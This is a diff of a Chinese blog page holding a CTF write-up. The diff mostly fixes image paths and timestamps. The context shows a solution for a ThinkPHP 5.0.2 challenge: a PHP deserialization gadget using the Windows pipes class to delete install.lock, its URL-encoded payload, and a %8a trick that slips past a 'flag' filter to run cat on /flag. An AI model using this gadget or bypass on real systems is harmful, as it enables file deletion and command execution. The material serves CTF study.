@@ -27,17 +27,17 @@
 <meta property="og:site_name" content="Daq1ang">
 <meta property="og:description" content="前言摸了几天鱼，终于想起来月饼杯了，趁今天课少把题目复现一遍 web签到123456789101112&lt;?php&#x2F;&#x2F;Author:H3h3QAQinclude &quot;flag.php&quot;;highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&quot;YBB&quot;])) &amp;#123;    if (has">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/1.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/2.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/3.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/4.png">
-<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/5.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/1.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/2.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/3.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/4.png">
+<meta property="og:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/5.png">
 <meta property="article:published_time" content="2021-09-28T13:18:46.000Z">
-<meta property="article:modified_time" content="2021-09-28T16:01:00.195Z">
+<meta property="article:modified_time" content="2021-09-29T10:25:35.376Z">
 <meta property="article:author" content="六公子买单">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog/jdqblog/source_posts/月饼杯2021/1.png">
+<meta name="twitter:image" content="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/1.png">
 
 <link rel="canonical" href="https://jingdaqiang.github.io/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/">
 
@@ -187,7 +187,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-09-29 00:01:00" itemprop="dateModified" datetime="2021-09-29T00:01:00+08:00">2021-09-29</time>
+                <time title="Modified: 2021-09-29 18:25:35" itemprop="dateModified" datetime="2021-09-29T18:25:35+08:00">2021-09-29</time>
               </span>
 
           
@@ -217,21 +217,21 @@
 </ul>
 <p>解题：</p>
 <p>访问index.php/index.phpindex/index/backdoor</p>
-<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog\jdqblog\source_posts\月饼杯2021\1.png" alt="1"></p>
+<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/1.png" alt="1"></p>
 <p>意思和backdoor表达的差不多，这文件没删，挡着道了</p>
 <p>这是thinkPHP框架漏洞，可下载5.0.2框架分析代码漏洞可利用点。index涉及到了反序列化，没得跑了，搜索常见反序列化魔法函数，全局搜索__destruct()</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发：通过_construct()函数产生所需要的类，销毁时执行指向类内的函数达到应用要求</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog\jdqblog\source_posts\月饼杯2021\2.png" alt="2"></p>
+<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/2.png" alt="2"></p>
 <p>这个比较有用，继续跟踪removeFiles()函数，</p>
-<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog\jdqblog\source_posts\月饼杯2021\3.png" alt="3"></p>
+<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/3.png" alt="3"></p>
 <p>构造</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$files</span>=[];</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;files = [<span class="string">&#x27;/var/www/html/application/index/controller/../../install.lock&#x27;</span>];</span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="comment">//O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A61%3A%22%2Fvar%2Fwww%2Fhtml%2Fapplication%2Findex%2Fcontroller%2F..%2F..%2Finstall.lock%22%3B%7D%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>在backdoor传参</p>
-<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog\jdqblog\source_posts\月饼杯2021\4.png" alt="4"></p>
+<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/4.png" alt="4"></p>
 <p>发现可以post传参了，题目涉及到函数<code>escapeshellarg</code>，即可直接如代码所给cat执行命令</p>
-<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/blog\jdqblog\source_posts\月饼杯2021\5.png" alt="5"></p>
+<p><img src="/2021/09/28/%E6%9C%88%E9%A5%BC%E6%9D%AF2021/5.png" alt="5"></p>
 <p>题目提示  ：flag位置/flag         由于过滤了flag  </p>
 <p>cmd=/fla%8ag得flag     (url解码后为不可见字符，命令解析时直接跳过)</p>
 <h2 id="不要离开我"><a href="#不要离开我" class="headerlink" title="不要离开我"></a>不要离开我</h2>
